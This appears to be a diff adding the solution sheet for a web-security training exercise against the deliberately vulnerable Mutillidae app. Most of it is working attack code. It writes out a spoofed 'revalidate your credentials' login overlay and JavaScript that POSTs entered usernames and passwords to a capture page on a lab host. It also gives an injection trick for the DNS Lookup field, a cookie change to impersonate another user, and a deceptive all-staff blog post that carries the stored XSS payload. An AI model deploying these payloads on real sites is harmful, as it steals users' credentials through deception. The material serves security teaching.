@@ -1,0 +1,139 @@
+Exercise 4 Solutions
+====================
+
+1. The FORM should be something like the example provided:
+
+	<div id="revalidate" style="padding:20px; position: absolute; top: 250px; left: 400px; background-color:#ccccff; border: solid black 1px; border-radius:15px;">	
+		<form>
+			<table style="font-weight:bold;">
+				<tr><td colspan="2" style="font-size:20px;">Login Timeout - Please revalidate your credentials</td></tr>
+				<tr><td colspan="2">&nbsp;</td></tr>
+				<tr><td>Username</td><td><input name="username" type="text"></td></tr>
+				<tr><td>Password</td><td><input name="password" type="password"></td></tr>
+				<tr><td colspan="2" style="text-align:center;"><input type="button" onclick="javascript:alert(this.form.username.value + ' ' + this.form.password.value);" value="Submit"></td></tr>
+			</table>
+		</form>
+	</div>
+
+Some important points about the form are the use of a <div> to allow it to be 
+positioned and styled so it looks like a new window and the use of the onClick handler 
+for the input button to allow the JavaScript function to be called (here just alert()).
+The use of the Mutillidae background colour (#ccccff) helps the window to blend in too.
+
+2. The JavaScript function is a bit fiddly to get right (it took us a while when 
+   creating the session and we knew what the answer should look like).  A suitable
+   function is provided in the form-proc-function.txt file and shown below:
+
+   	function saveUserData(theForm){
+			try{ 
+				var userinfo = "username=" + theForm.username.value + "&password=" + theForm.password.value;
+
+				var req = new XMLHttpRequest(); 
+				req.onreadystatechange = function(){ 
+					if(req.readyState == 4){ 
+						theForm.parentNode.style.display="none"; 
+					}
+				};
+		
+				req.open("post", "http://192.168.56.101:9000/index.php?page=capture-data.php", true);
+				req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+				req.send(userinfo);		
+			}catch(e){ 
+				alert(e.message);
+			};
+		};
+
+	The really awkward bits are knowing how to hide the FORM (the onReadyStateChange
+	callback in the code) and getting the POST URL right to drive Mutillidae correctly.
+
+	If you are struggling to test this, you can use a slightly simpler function that
+	doesn't use a FORM, and post it into the Add to my Blog page in a SCRIPT tag:
+
+		<SCRIPT>
+	 	function testSavingData(username, password){
+			try{ 
+				var userinfo = "username=" + username + "&password=" + password;
+
+				var req = new XMLHttpRequest(); 
+				req.onreadystatechange = function(){ 
+					if(req.readyState == 4){ 
+						theForm.parentNode.style.display="none"; 
+					}
+				};
+		
+				req.open("post", "http://192.168.56.101:9000/index.php?page=capture-data.php", true);
+				req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+				req.send(userinfo);		
+			}catch(e){ 
+				alert(e.message);
+			};
+		};
+		testSavingData("alice", "theadams") ;
+		</SCRIPT>
+
+	If this is working, you should see entries for "alice" / "theadams" on your
+	Captured Data page.
+
+3. When you put your JavaScript and HTML together you should end up with something
+   like this:
+
+   <div id="revalidate" style="padding:20px; position: absolute; top: 250px; left: 400px; background-color:#ccccff; border: solid black 1px; border-radius:15px;">
+		<script>
+		function saveUserData(theForm){
+			try{ 
+				var userinfo = "username=" + theForm.username.value + "&password=" + theForm.password.value;
+
+				var req = new XMLHttpRequest(); 
+				req.onreadystatechange = function(){ 
+					if(req.readyState == 4){ 
+						theForm.parentNode.style.display="none"; 
+					}
+				};
+		
+				req.open("post", "http://192.168.56.101:9000/index.php?page=capture-data.php", true);
+				req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+				req.send(userinfo);		
+			}catch(e){ 
+				alert(e.message);
+			};
+		};//end function
+		</script>
+		<form>
+			<table style="font-weight:bold;">
+				<tr><td colspan="2" style="font-size:20px;">Login Timeout - Please revalidate your credentials</td></tr>
+				<tr><td colspan="2">&nbsp;</td></tr>
+				<tr><td>Username</td><td><input name="username" type="text"></td></tr>
+				<tr><td>Password</td><td><input name="password" type="password"></td></tr>
+				<tr><td colspan="2" style="text-align:center;"><input type="button" onclick="javascript:saveUserData(this.form);" value="Submit"></td></tr>
+			</table>
+		</form>
+	</div>
+
+	If you post this into the DNS Lookup page host field, this gives you a way of
+	testing it as a "reflected" attack without writing it to the database.
+
+	In order to do this prepend "CANARY</div>" before the <div> you are inserting and
+	add an additional </div> at the end.  This makes the resulting HTML valid and you
+	will get the form displayed immediately and the login details should be posted to 
+	the user details page.
+
+
+4. The final part of the puzzle is to work out how to put this malicious code somewhere
+   that a lot of people will accidentally run it.  Where better than a blog post for
+   an important person.  We've decided that "tim" (UID 18) is an important person.
+
+   To perform this final part of the attack, use the HTTP parameter attack from 
+   Exercise 3 to change the "uid" cookie to "18" and post a blog entry something like:
+
+      This is a very important message to all staff, please pass it on and make
+      sure that everyone reads it.  We have been having security problems and
+      so much validate our passwords.  As we use the systems, at various points
+      we may be asked  to log in again.  Please do so and make sure your
+      colleagues do too.  <div id="revalidate" style="padding:20px; position: absolute; top: 250px; left: 400px; background-color:#ccccff; border: solid black 1px; border-radius:15px;"> 
+      ...
+      ...
+      </div>
+
+   This will cause the login box to appear when anyone views that blog and when
+   they fill in login details they should appear on the Captured Data page.
+   
